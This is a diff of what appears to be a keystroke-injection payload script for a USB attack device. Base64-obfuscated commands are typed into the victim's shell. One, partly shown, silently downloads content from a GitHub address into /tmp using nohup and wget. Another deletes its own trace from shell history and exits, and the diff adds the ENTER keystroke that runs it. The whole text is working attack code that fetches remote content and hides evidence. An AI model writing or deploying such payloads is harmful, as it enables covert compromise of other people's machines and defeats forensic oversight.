@@ -20,3 +20,4 @@ STRING base64 -d <<< Y2QgL3RtcC8gJiYgbm9odXAgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20
 ENTER
 DELAY 500
 STRING base64 -d <<< aGlzdG9yeSB8IGdyZXAgaGlzdG9yeSAmJiBsaW5lPSQoaGlzdG9yeSB8IGdyZXAgaGlzdG9yeSB8IGF3ayAneyBwcmludCAkMSB9JykgJiYgaGlzdG9yeSAtZCAkbGluZSAmJiBzZXQgLW8gaGlzdG9yeSAmJiBleGl0Cg== | sh
+ENTER
